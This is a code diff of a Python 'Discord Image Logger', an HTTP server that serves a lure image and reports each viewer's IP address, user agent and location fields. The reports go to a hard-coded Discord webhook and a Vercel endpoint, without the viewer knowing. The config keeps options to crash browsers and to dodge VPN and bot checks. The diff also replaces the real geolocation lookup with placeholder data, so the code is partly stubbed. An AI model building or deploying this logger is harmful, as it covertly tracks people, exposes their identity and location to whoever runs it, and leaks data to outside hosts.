@@ -1,46 +1,37 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
+import http.client
+import json
 import traceback
 import requests
-import base64
-import httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to log IP addresses by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1251225809595928738/baEQyV0CeLbBCSXgpgZbT_vJjNh13wKJRhhT_VK4PJTpONNqT0Lk82F_sfQH82e_60_X",
-    "image": "https://zapodaj.net/images/8ac87317bfd76.jpg",  # Default image URL
-    "imageArgument": True,  # Allows using a URL argument to change the image
-
-    # CUSTOMIZATION #
-    "username": "Image Logger",  # Webhook username
-    "color": 0x00FFFF,  # Embed color (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False,  # Attempts to crash/freeze the user's browser
-    "accurateLocation": False,  # Uses GPS for accurate location (disabled due to user prompt)
-    "message": {  # Custom message when the image is opened
-        "doMessage": False,  # Enable custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message content
-        "richMessage": True,  # Use rich text?
+    "image": "https://zapodaj.net/images/8ac87317bfd76.jpg",
+    "username": "Image Logger",
+    "color": 0x00FFFF,
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "richMessage": True,
     },
-    "vpnCheck": 1,  # VPN detection level
-    "linkAlerts": True,  # Alert when the link is sent multiple times
-    "buggedImage": True,  # Shows loading image as preview in Discord
-    "antiBot": 1,  # Bot detection level
-
-    # REDIRECTION #
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
     "redirect": {
-        "redirect": False,  # Redirect enabled?
-        "page": ""  # Redirect page URL
-    }
+        "redirect": False,
+        "page": ""
+    },
+    "imageArgument": True,
+    "crashBrowser": False,
 }
 
-blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IP prefixes
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -50,78 +41,54 @@ def botCheck(ip, useragent):
     else:
         return False
 
-def reportError(error):
-    requests.post(config["webhook"], json={
+def reportError(error_message):
+    payload = {
         "username": config["username"],
         "content": "@everyone",
         "embeds": [
             {
                 "title": "Image Logger - Error",
                 "color": config["color"],
-                "description": f"An error occurred while logging an IP!\n\n**Error:**\n```\n{error}\n```",
+                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error_message}\n```",
             }
         ],
-    })
+    }
+    requests.post(config["webhook"], json=payload)
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs):
-        return
+    try:
+        if ip.startswith(blacklistedIPs):
+            return
 
-    bot = botCheck(ip, useragent)
+        bot = botCheck(ip, useragent)
 
-    if bot:
-        requests.post(config["webhook"], json={
+        ping = "@everyone"
+
+        # Example data, replace with actual API calls or data source
+        info = {
+            "isp": "Example ISP",
+            "as": "Example AS",
+            "country": "Example Country",
+            "regionName": "Example Region",
+            "city": "Example City",
+            "lat": "Example Latitude",
+            "lon": "Example Longitude",
+            "timezone": "Example/Timezone",
+            "mobile": False,
+            "proxy": False,
+            "hosting": False,
+        }
+
+        os, browser = "Example OS", "Example Browser"
+
+        embed = {
             "username": config["username"],
-            "content": "",
+            "content": ping,
             "embeds": [
                 {
-                    "title": "Image Logger - Link Sent",
+                    "title": "Image Logger - IP Logged",
                     "color": config["color"],
-                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-                }
-            ],
-        }) if config["linkAlerts"] else None
-        return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-            return
-
-        if config["vpnCheck"] == 1:
-            ping = ""
-
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-            return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-            ping = ""
-
-    os, browser = httpagentparser.simple_detect(useragent)
-
-    embed = {
-        "username": config["username"],
-        "content": ping,
-        "embeds": [
-            {
-                "title": "Image Logger - IP Logged",
-                "color": config["color"],
-                "description": f"""**A User Opened the Original Image!**
+                    "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
 
@@ -143,16 +110,29 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Browser:** `{browser}`
 
 **User Agent:** `{useragent}`
-                """
-            }
-        ],
-    }
+                    """
+                }
+            ],
+        }
 
-    if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
+        if url:
+            embed["embeds"][0].update({"thumbnail": {"url": url}})
 
-    requests.post(config["webhook"], json=embed)
-    return info
+        endpoint_url = "https://discord1-n607hx2yo-dzidas-projects.vercel.app/api/main"
+        headers = {'Content-type': 'application/json'}
+        conn = http.client.HTTPSConnection("discord1-n607hx2yo-dzidas-projects.vercel.app")
+        conn.request("POST", "/api/main", json.dumps(embed), headers)
+        response = conn.getresponse()
+        data = response.read()
+        conn.close()
+
+    except Exception as e:
+        error_message = f"Error occurred: {str(e)}\n\n{traceback.format_exc()}"
+        reportError(error_message)
+
+binaries = {
+    "loading": b"ExampleBinaryData",
+}
 
 class ImageLoggerHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -162,18 +142,15 @@ class ImageLoggerHandler(BaseHTTPRequestHandler):
             useragent = self.headers.get('User-Agent')
             image = config["image"]
 
-            # Check if there's a URL argument to override the image
             if config["imageArgument"] and "url" in url_params:
                 image = url_params["url"][0]
 
-            # Simulate crashing the browser (if enabled)
             if config["crashBrowser"]:
                 self.send_response(200)
                 self.end_headers()
-                self.wfile.write(b"Crash the browser here...")
+                self.wfile.write(binaries["loading"])
                 return
 
-            # Send a custom message (if enabled)
             if config["message"]["doMessage"]:
                 message = config["message"]["message"]
                 if config["message"]["richMessage"]:
@@ -188,14 +165,12 @@ class ImageLoggerHandler(BaseHTTPRequestHandler):
                     self.wfile.write(message.encode('utf-8'))
                 return
 
-            # Redirect to another page (if enabled)
             if config["redirect"]["redirect"]:
                 self.send_response(301)
                 self.send_header('Location', config["redirect"]["page"])
                 self.end_headers()
                 return
 
-            # Handle image logging
             if image in self.path:
                 self.send_response(200)
                 self.end_headers()
@@ -204,32 +179,23 @@ class ImageLoggerHandler(BaseHTTPRequestHandler):
                 if "ip" in url_params and "endpoint" in url_params:
                     coords = url_params["ip"][0]
                     endpoint = url_params["endpoint"][0]
-                    makeReport(ip, useragent, coords, endpoint, image)
-
-                return
-
-            # Default response if image logging path not matched
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b'404 - Not Found')
+                    makeReport(ip, useragent, coords, endpoint)
 
         except Exception as e:
-            error_message = f"Error occurred: {str(e)}\n\n{traceback.format_exc()}"
-            print(error_message)
-            reportError(error_message)
-
+            reportError(str(e))
             self.send_response(500)
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
+            self.wfile.write(b"Internal Server Error")
 
-if __name__ == "__main__":
-    host = 'localhost'
-    port = 8000  # Zmieniony port na 8000
-    server = HTTPServer((host, port), ImageLoggerHandler)
-    print(f'Started {__app__} server at http://{host}:{port}')
+def run(server_class=HTTPServer, handler_class=ImageLoggerHandler, host='localhost', port=8000):
     try:
-        server.serve_forever()
+        server_address = (host, port)
+        httpd = server_class(server_address, handler_class)
+        print(f'Started {__app__} server at http://{host}:{port}')
+        httpd.serve_forever()
     except KeyboardInterrupt:
-        pass
-    server.server_close()
-    print(f'Stopped {__app__} server')
+        print(f'Stopped {__app__} server')
+        httpd.server_close()
+
+if __name__ == '__main__':
+    run()
